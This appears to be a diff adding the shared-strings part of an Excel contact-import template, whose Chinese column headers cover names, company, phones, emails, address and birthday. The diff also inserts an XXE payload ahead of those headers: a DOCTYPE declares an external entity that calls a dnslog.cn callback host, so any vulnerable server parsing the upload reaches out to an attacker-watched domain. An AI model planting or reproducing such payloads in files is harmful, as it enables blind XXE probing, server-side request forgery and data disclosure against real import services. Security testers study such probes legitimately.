@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://n66vw1.dnslog.cn/"> ]>
+<x>&xxe;</x>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="24" uniqueCount="24"><si><t>姓名</t></si><si><t>姓氏</t></si><si><t>名字</t></si><si><t>公司</t></si><si><t>部门</t></si><si><t>职位</t></si><si><t>手机1</t></si><si><t>手机2</t></si><si><t>电话1</t></si><si><t>电话2</t></si><si><t>传真1</t></si><si><t>传真2</t></si><si><t>邮箱1</t></si><si><t>邮箱2</t></si><si><t>地址:国家</t></si><si><t>省</t></si><si><t>城市</t></si><si><t>街道1</t></si><si><t>街道2</t></si><si><t>邮政编码</t></si><si><t>网址</t></si><si><t>生日(YYYY-MM-DD)</t></si><si><t>纪念日(YYYY-MM-DD)</t></si><si><t>备注(其他内容可通过备注导入)</t></si></sst>
